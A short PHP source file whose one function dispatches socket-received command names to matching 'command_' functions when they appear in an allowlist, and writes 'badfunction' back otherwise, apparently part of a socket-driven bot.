<?php
function commands() {
  global $socket;
  global $multibotObject;
  global $buffer;
  global $functions_to_start;
  global $commands_list;
  if(in_array($buffer[0], $commands_list))  {
    $command = "command_".$buffer[0];
    $return = $command();
    unset($buffer);
    return $return;
  }else {
    $msg = "badfunction";
    socket_write($socket, $msg, strlen($msg));
    return false;
  }
}





?>
